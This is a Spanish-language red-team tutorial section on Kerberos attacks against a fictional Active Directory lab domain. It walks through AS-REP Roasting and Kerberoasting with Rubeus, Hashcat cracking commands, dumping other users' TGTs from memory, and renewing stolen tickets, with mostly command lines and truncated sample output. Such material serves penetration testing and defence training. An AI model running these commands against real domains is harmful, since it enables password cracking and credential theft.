Este apartado cubre las técnicas básicas que giran en torno a los tickets de Kerberos: cómo arrancar contraseñas a partir de ellos (AS-REP Roasting y Kerberoasting) y cómo extraer y reutilizar tickets ya emitidos desde la memoria de un equipo.

---

#### AS-REP Roasting

Apunta a cuentas que tienen **deshabilitada la preautenticación Kerberos**. En esas cuentas, cualquiera puede mandar un AS-REQ sin marca de tiempo válida y el KDC responde con un AS-REP que incluye un bloque cifrado con el hash de la contraseña del usuario. Ese bloque se extrae y se crackea **offline** hasta recuperar la contraseña.

El comando `asreproast` enumera las cuentas sin preautenticación, lanza el AS-REQ y extrae la parte cifrada:

```
Rubeus.exe asreproast /format:hashcat /nowrap

[*] SamAccountName  : svc_oracle
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:
$krb5asrep$23$svc_oracle@dragon.com:92D6F[...recortado...]19124
```

- `/format:hashcat` → genera el hash para Hashcat (por defecto lo da para John).
- `/nowrap` → no parte la salida en varias líneas (más fácil de copiar).

El hash resultante se crackea con el modo **18200** de Hashcat:

```
hashcat -a 0 -m 18200 asrep.hash diccionario.txt -r reglas\dive.rule
$krb5asrep$23$svc_oracle@dragon.com:92d6f[...recortado...]19124:Passw0rd!
```

---

#### Kerberoasting

Apunta a la contraseña de la **cuenta de servicio asociada a un SPN**. Cualquier usuario autenticado puede pedir un TGS para un SPN; el TGS-REP viene cifrado con la clave del servicio, y ese bloque se crackea offline.

No funciona contra servicios que corren como cuenta de equipo (sus contraseñas son aleatorias de 128 caracteres y rotan cada 30 días). El objetivo real son **cuentas de servicio creadas por personas**, con contraseñas débiles o que no caducan.

```
Rubeus.exe kerberoast /format:hashcat /simple

[*] Total kerberoastable users : 1
$krb5tgs$23$*svc_db$dragon.com$MSSQLSvc/server-database.dragon.com:1433@dragon.com*$95505[...recortado...]9A715
```

- `/simple` → imprime solo el hash, sin todo el detalle por cuenta.

Se crackea con el modo **13100** de Hashcat:

```
hashcat -a 0 -m 13100 kerb.hash diccionario.txt -r reglas\dive.rule
```

Como la mayoría de herramientas roastean todas las cuentas con SPN de golpe (ruidoso), es mejor enumerar primero y atacar un objetivo concreto con `/spn:`:

```
Rubeus.exe kerberoast /spn:MSSQLSvc/server-database.dragon.com:1433 /simple /nowrap
```

---

#### Extracción de tickets desde memoria

Con acceso privilegiado a un equipo, se pueden sacar los tickets Kerberos cacheados en memoria y reutilizarlos. El comando `triage` lista todas las sesiones de inicio de sesión y sus tickets:

```
Rubeus.exe triage

 | LUID     | UserName              | Service                       | EndTime             |
 | 0xd42c80 | attacker @ DRAGON.COM | krbtgt/DRAGON.COM             | 17/02/2025 19:53:40 |
 | 0x692d8c | victim @ DRAGON.COM   | krbtgt/DRAGON.COM             | 17/02/2025 20:07:34 |
 | 0x3e4    | server-ws$ @ DRAGON   | cifs/dragon-dc.dragon.com     | 17/02/2025 19:32:09 |
```

Los tickets cuyo servicio es `krbtgt` son **TGT**; el resto son tickets de servicio. Si hay varias sesiones (varios usuarios en el mismo equipo), puedes robar sus TGT/tickets. Para volcar uno concreto se usa `dump` filtrando por sesión y/o servicio:

```
Rubeus.exe dump /luid:0xd42c80 /service:krbtgt /nowrap

  UserName  : attacker
    ServiceName   :  krbtgt/DRAGON.COM
    EndTime       :  17/02/2025 19:53:40
    Base64EncodedTicket : doIFm[...recortado...]DT00=
```

- `/luid:` → la sesión de inicio de sesión objetivo.
- `/service:krbtgt` → filtra solo los TGT (omítelo para sacar todo).

Necesitas estar en una sesión de **alta integridad** para tocar tickets de LUID distintos al tuyo.

---

#### Renovación del TGT

Los hashes valen hasta que cambie la contraseña, pero los tickets caducan rápido. Con `describe` ves las tres fechas que importan:

```
Rubeus.exe describe /ticket:doIFq[...recortado...]uQ09N

  StartTime   :  11/04/2025 16:33:17
  EndTime     :  12/04/2025 02:33:17
  RenewTill   :  18/04/2025 16:33:17
```

- **StartTime** → cuándo se emitió.
- **EndTime** → cuándo expira (por defecto, 10 h después de StartTime).
- **RenewTill** → fecha límite para renovar (por defecto, 7 días después).

Mientras no se pase de `RenewTill`, se puede renovar cada 10 h sin contraseña con `renew`:

```
Rubeus.exe renew /ticket:doIFq[...recortado...]uQ09N /nowrap

[+] TGT renewal request successful!
```

Tras renovar, StartTime/EndTime se actualizan pero RenewTill sigue igual: cuando se alcanza, hay que generar un TGT nuevo.
